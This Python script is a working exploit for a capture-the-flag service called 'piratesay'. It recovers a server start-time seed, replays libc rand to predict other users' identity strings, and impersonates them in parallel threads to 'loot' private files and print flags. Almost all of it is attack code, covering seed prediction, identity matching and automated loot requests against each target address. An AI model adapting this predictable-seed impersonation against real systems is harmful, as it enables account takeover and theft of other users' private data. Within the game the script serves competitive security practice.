#!/usr/bin/env python3

import base64
import ctypes
import hashlib
import json
import random
import re
import socket
import string
import sys
import threading
import time
import traceback
from concurrent.futures import ThreadPoolExecutor
from typing import Optional

import requests

directories = [
    "BlackbeardCove",
    "TreasureIsland",
    "SkullAndBonesReef",
    "DeadMansBay",
    "JollyRogersHarbor",
    "BuccaneerBeach",
    "PirateHideout",
    "CutthroatCreek",
    "SirenShores",
    "CorsairCastle",
    "WickedWaters",
    "MaroonersLagoon",
    "ParrotPerch",
    "RumRunnersRidge",
    "GalleonGraveyard"
]

pirate_adjectives = [
    "Red", "Black", "Silver", "Golden", "Scarlet", "Dark", "White", "Blue", "Rogue", "Stormy",
    "Fearsome", "Mighty", "Brave", "Savage", "Fiery", "Cunning", "Bold", "Fierce", "Grim", "Vengeful",
    "Merciless", "Wild", "Daring", "Stealthy", "Ferocious", "Deadly", "Bloodthirsty", "Cruel", "Relentless", "Treacherous",
    "Wrathful", "Ruthless", "Sinister", "Ghostly", "Iron", "Steel", "Thunderous", "Shadowy", "Mysterious", "Menacing",
    "Dauntless", "Unyielding", "Reckless", "Savvy", "Fearless", "Intrepid", "Grizzled", "Vigilant", "Crafty", "Sly",
    "Swift", "Dreadful", "Gallant", "Heroic", "Legendary", "Wicked", "Terrorizing", "Formidable", "Chaotic", "Brutal",
    "Perilous", "Noble", "Valiant", "Infernal", "Monstrous", "Raging", "Vicious", "Sinful", "Boldhearted", "Ferocious",
    "Indomitable", "Savage", "Dreaded", "Fabled", "Majestic", "Unstoppable", "Ancient", "Stalwart", "Mythic", "Untamed",
    "Mystic", "Prowling", "Doomed", "Forgotten", "Seafaring", "Wandering", "Shadow", "Deepsea", "Stormborn", "Windrider",
    "Tidal", "Maelstrom", "Typhoon", "Tempest", "Harpooner", "Corsair", "Buccaneer", "Seawolf", "SeaSerpent", "Kraken"
]
pirate_nouns = [
    "Beard", "Jack", "Bart", "Pete", "Anne", "Patty", "John", "Hook", "Bill", "Bonny",
    "Morgan", "Davy", "Blackbeard", "Silver", "LongJohn", "Calico", "Rackham", "Teach", "Drake", "Roberts",
    "Lafitte", "Vane", "Flint", "Kidd", "Bartholomew", "Edward", "Mary", "Jane", "Blood", "Cannon",
    "Cutlass", "Sparrow", "Corsair", "Marooner", "SeaDog", "Scallywag", "Buccaneer", "SeaWolf", "Privateer", "Matey",
    "Swashbuckler", "Skull", "Crossbones", "Treasure", "Galleon", "Parrot", "Pistol", "Rum", "Sloop", "Brig",
    "PirateKing", "Siren", "Corsair", "JollyRoger", "Bounty", "Scourge", "SeaSerpent", "Kraken", "Marauder", "Plunder",
    "Loot", "Booty", "BountyHunter", "Mutineer", "Captain", "Quartermaster", "Gunner", "Boatswain", "Lookout", "Sailor",
    "Navigator", "FirstMate", "Shipwright", "PowderMonkey", "CabinBoy", "Deckhand", "Helmsman", "Longboat", "Cannoneer", "Shipmate",
    "PirateQueen", "SeaRover", "SeaRaider", "SeaCaptain", "Freebooter", "Wench", "Swabber", "Harpooner", "SeaWitch", "Buoy",
    "Gangplank", "Mainmast", "Crowsnest", "Forecastle", "Hold", "Broadside", "Bilge", "Grog", "Anchor", "Tide"
]

NUM_ADJECTIVES = len(pirate_adjectives)
NUM_NOUNS = len(pirate_nouns)
IDENTITY_LENGTH = 64

# Load the C standard library
libc = ctypes.CDLL(None)

# Set argument and return types
libc.srand.argtypes = [ctypes.c_uint]
libc.rand.restype = ctypes.c_int

def generate_identity_string():
    return ''.join(chr(ord('a') + (libc.rand() % 26)) for _ in range(IDENTITY_LENGTH))

def get_unix_time_from_string(date_string):
    # Format of date_string: "2024-07-15 11:35:24"
    return int(time.mktime(time.strptime(date_string, "%Y-%m-%d %H:%M:%S")))

def get_adjective_from_identity(identity_string):
    hash = 5381
    for c in identity_string:
        hash = ((hash << 5) + hash) + ord(c)  # hash * 33 + ord(c)
        hash = hash & 0xFFFFFFFF  # Ensure hash is a 32-bit unsigned integer
    index = hash % NUM_ADJECTIVES
    return pirate_adjectives[index]

def get_noun_from_identity(identity_string):
    hash = 5381
    for c in identity_string:
        hash = ((hash << 5) + hash) + ord(c)  # hash * 33 + ord(c)
        hash = hash & 0xFFFFFFFF  # Ensure hash is a 32-bit unsigned integer
    index = (hash >> 16) % NUM_NOUNS  # Shift to get a different part of the hash
    return pirate_nouns[index]

# Establish a single connection to get the seed and current identity
def get_seed_and_current_identity(host, port):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((host, port))
        
        # Receive the initial server message
        def recv_until_prompt(prompt):
            data = b''
            while not data.endswith(prompt):
                data += s.recv(1024)
            return data

        initial_message = recv_until_prompt(b'$ ').decode()
        # Extract the timestamp from the initial message
        match = re.search(r'\(Pirate Say v1.0.0, up since (.+?)\)', initial_message)
        if match:
            seed_string = match.group(1)
            seed = get_unix_time_from_string(seed_string)
        else:
            print("Failed to extract seed from server message")
            exit(1)

        # Get the current identity
        s.sendall(b'identity\n')
        identity_response = recv_until_prompt(b': ').decode()
        s.sendall(b'\n')  # Keeping current identity
        recv_until_prompt(b'$ ')
        current_identity = identity_response.split("\n")[0].split(":")[1].strip()

        return seed, current_identity

# Get identity strings with same name as target file
def get_matching_identites(seed, current_identity, target_file):
    
    # Generate all potential identities up to the current one
    libc.srand(seed)
    potential_identities = []
    while True:
        identity_string = generate_identity_string()
        potential_identities.append(identity_string)
        if identity_string == current_identity:
            break

    # Extract the name from the target_file
    target_name = target_file.split('_')[0] + '_' + target_file.split('_')[1]

    # Filter to get those that match the target name
    matching_identities = []
    for identity in potential_identities:
        adj = get_adjective_from_identity(identity)
        noun = get_noun_from_identity(identity)
        scammer_name = f"{adj}_{noun}".lower()
        if target_name in scammer_name:
            matching_identities.append(identity)
    
    return matching_identities

# Define a function to process each identity
def process_identity(identity, target_file, target_directory, host, port):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((host, port))

        def recv_until_prompt(prompt):
            data = b''
            while not data.endswith(prompt):
                data += s.recv(1024)
            return data
        
        s.sendall(b'identity\n')
        recv_until_prompt(b': ')
        s.sendall(identity.encode() + b'\n')
        recv_until_prompt(b'$ ')

        s.sendall(f'sail {target_directory}\n'.encode())
        recv_until_prompt(b'$ ')
        s.sendall(f'loot {target_file}\n'.encode())
        response = recv_until_prompt(b'$ ')
        
        return response


TARGET = sys.argv[1] # The target's ip address is passed as an command line argument
PORT = 4444

def exploit(hint: Optional[str], flag_store: Optional[int]):
    print(f'Attacking {TARGET} (flag_store={flag_store}, hint={hint})')

    # TODO implement exploit

    private_dir, private_file = hint.split('/')

    seed, current_identity = get_seed_and_current_identity(TARGET, PORT)
    matching_identities = get_matching_identites(seed, current_identity, private_file)
        
    # Use ThreadPoolExecutor to parallelize the process_identity function
    with ThreadPoolExecutor() as executor:
        responses = executor.map(lambda identity: process_identity(identity, private_file, private_dir, TARGET, PORT), matching_identities)

    # Iterate over the responses to find the flag
    for response in responses:
        if "Protected with identity hash" in response.decode():
            flag = response.decode().split('Scammer ID: ')[1].split('\n')[0]
            print(flag)
            return

# Some CTFs publish information ('flag hints') which help you getting individual flags (e.g. the usernames of users that deposited flags).
# Bambi CTF / ENOWARS flag hints:
attack_info = requests.get('http://10.0.13.37:5001/scoreboard/attack.json').json()
service_info = attack_info['services']['piratesay']
team_info = service_info[TARGET] # Get the information for the current target
threads = []
for round_nr in team_info:
    round_info = team_info[round_nr]
    # Exploit 2 is in flag_store 1
    flag_store = '1'
    store_info = round_info[flag_store]
    for flag_info in store_info:
        # flag_info will always be a string, which you might have to parse with json.loads
        t = threading.Thread(target=exploit, args=(flag_info, flag_store))
        t.start()
        threads.append(t)
for thread in threads:
    try:
        thread.join()
    except Exception as e:
        print(e)